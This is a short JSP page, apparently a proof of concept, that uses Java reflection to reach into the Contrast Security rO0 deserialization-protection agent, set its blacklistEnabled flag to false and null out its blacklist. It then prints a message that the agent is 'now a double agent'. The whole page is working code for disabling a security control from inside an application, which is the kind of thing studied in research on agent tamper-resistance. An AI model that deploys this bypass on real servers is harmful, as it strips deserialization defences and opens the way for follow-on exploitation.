<html>
<body>
<%

	try{
            Class<?> agent = ClassLoader.getSystemClassLoader()
                    .loadClass("com.contrastsecurity.rO0.RO0Agent");
    
            java.lang.reflect.Field configField = agent.getField("config");
            Object configObj = configField.get(null);
            Class<?> configClass = configObj.getClass();
            java.lang.reflect.Field blacklistEnabledField =
                    configClass.getDeclaredField("blacklistEnabled");
            blacklistEnabledField.setAccessible(true);
            blacklistEnabledField.setBoolean(configObj, false);
            java.lang.reflect.Field blacklistField =
                    configClass.getDeclaredField("blacklist");
            blacklistField.setAccessible(true);
            blacklistField.set(configObj, null);
			out.println("<br/><h2>Instrumentation agent is now a double agent</h2>"); 
	}
	catch(Exception e){}
%>
</body>
</html>